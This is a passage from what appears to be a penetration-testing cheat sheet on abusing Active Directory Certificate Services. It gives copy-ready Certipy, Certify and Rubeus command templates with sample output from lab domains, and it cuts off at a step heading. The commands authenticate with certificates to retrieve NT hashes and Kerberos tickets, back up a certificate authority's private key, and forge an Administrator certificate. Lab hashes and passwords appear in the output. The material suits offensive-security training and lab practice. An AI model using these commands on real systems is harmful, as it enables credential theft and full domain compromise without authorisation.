<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; certipy-ad auth -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s 10.129.33.22 <span class="o">&amp;&amp;</span> certipy-ad auth -pfx <span class="s1">'ryan.cooper.pfx'</span> -domain sequel.htb -dc-ip 10.129.33.22
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN UPN: 'Ryan.Cooper@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'ryan.cooper@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'ryan.cooper.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'ryan.cooper.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'ryan.cooper'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got hash for 'ryan.cooper@sequel.htb': aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945
</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><h4 id="1-request-a-certificate">1. Request a Certificate</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\Certify.exe request --ca <span class="o editable-keyword">&lt;SERVER&gt;</span>\<span class="o editable-keyword">&lt;CA&gt;</span> --template User
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\programdata&gt; .\Certify.exe request --ca dc01.haze.htb\haze-DC01-CA --template User
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   _____          _   _  __          
</span></span></span><span class="line"><span class="cl"><span class="go">  / ____|        | | (_)/ _|         
</span></span></span><span class="line"><span class="cl"><span class="go"> | |     ___ _ __| |_ _| |_ _   _    
</span></span></span><span class="line"><span class="cl"><span class="go"> | |    / _ \ '__| __| |  _| | | |   
</span></span></span><span class="line"><span class="cl"><span class="go"> | |___|  __/ |  | |_| | | | |_| |   
</span></span></span><span class="line"><span class="cl"><span class="go">  \_____\___|_|   \__|_|_|  \__, |   
</span></span></span><span class="line"><span class="cl"><span class="go">                             __/ |   
</span></span></span><span class="line"><span class="cl"><span class="go">                            |___./   
</span></span></span><span class="line"><span class="cl"><span class="go">  v2.0.0                         
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Request a certificate
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Current user context    : HAZE\Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">[*] No subject name specified, using current context as subject.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Template                : User
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Subject                 : CN=Administrator, CN=Users, DC=haze, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate Authority   : dc01.haze.htb\haze-DC01-CA
</span></span></span><span class="line"><span class="cl"><span class="go">[*] CA Response             : The certificate has been issued.
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID              : 3
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate (PFX)       :
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---0AaQBuAGkAcwB0AHIAYQB0AG8AcgAAAAAAAAAAAAAAAAAAAAA=
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Certify completed in 00:00:12.4915168
</span></span></span></div></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:'<span class="o editable-keyword">&lt;USER&gt;</span>' /certificate:<span class="o editable-keyword">&lt;BASE64_PFX&gt;</span> /getcredentials /show /nowrap
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\programdata&gt; .\rubeus.exe asktgt /user:'Administrator' /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---0AaQBuAGkAcwB0AHIAYQB0AG8AcgAAAAAAAAAAAAAAAAAAAAA= /getcredentials /show /nowrap
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.3.3 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Got domain: haze.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=haze, DC=htb 
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ PKINIT preauth) for: 'haze.htb\Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: ::1:88
</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGNDCCBjCgAwIBBaEDAgEWooIFUDCCBUxhggVIMIIFRKADAg---[SNIP]---pFLkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIaGF6ZS5odGI=
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/haze.htb
</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  HAZE.HTB
</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  Administrator (NT_PRINCIPAL)
</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  HAZE.HTB
</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  10/31/2025 5:41:29 PM
</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  11/1/2025 3:41:29 AM
</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  11/7/2025 4:41:29 PM
</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  rc4_hmac
</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  mg++FvMp7vpSnf+7apBBsg==
</span></span></span><span class="line"><span class="cl"><span class="go">  ASREP (key)              :  DF6B9986187FCB17B421C67BE7923396
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting credentials using U2U
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredentialInfo         :
</span></span></span><span class="line"><span class="cl"><span class="go">    Version              : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    EncryptionType       : rc4_hmac
</span></span></span><span class="line"><span class="cl"><span class="go">    CredentialData       :
</span></span></span><span class="line"><span class="cl"><span class="go">      CredentialCount    : 1
</span></span></span><span class="line"><span class="cl"><span class="go">       NTLM              : 06DC954D32CB91AC2831D67E3E12027F
</span></span></span></div></pre></div></div></div>

<p></p>
<hr>
<h3 id="administrator-of-ca-host">Administrator of CA Host</h3>
<p class="tabs">
<button data-tabset="set4" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set4"><div class="tabcontent active" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-backup-ca-certificate-and-private-key">1. Backup CA Certificate and Private Key</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -backup
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'admin'</span> -p <span class="s1">'Password123!'</span> -target dc.sequel.htb -ns 10.129.33.22 -backup
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Creating new service for backup operation
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate and private key
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backing up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backed up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -target <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -backup
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'admin@sequel.htb'</span> -p <span class="s1">'Password123!'</span> -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating new service for backup operation
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate and private key
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backing up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backed up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -backup
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'admin@sequel.htb'</span> -p <span class="s1">'Password123!'</span> -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating new service for backup operation
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate and private key
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backing up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backed up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -backup
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'admin@sequel.htb'</span> -hashes 2b576acbe6bcfda7294d6bd18041b8fe -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating new service for backup operation
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate and private key
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backing up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backed up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -backup
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'admin@sequel.htb'</span> -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Creating new service for backup operation
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving backup
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate and private key
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backing up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Backed up original PFX/P12 to 'pfx.p12'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up
</span></span></span></div></pre></div><h4 id="2-forge-a-certificate">2. Forge a Certificate</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad forge -ca-pfx <span class="o editable-keyword">&lt;CA&gt;</span>.pfx -upn administrator@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -subject 'CN=Administrator,CN=Users,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad forge -ca-pfx sequel-DC-CA.pfx -upn administrator@sequel.htb -subject <span class="s1">'CN=Administrator,CN=Users,DC=sequel,DC=htb'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Saving forged certificate and private key to 'administrator_forged.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
</span></span></span></div></pre></div><h4 id="3-export-crt-and-key-from-pfx">3. Export '.crt' and '.key' from '.pfx'</h4>
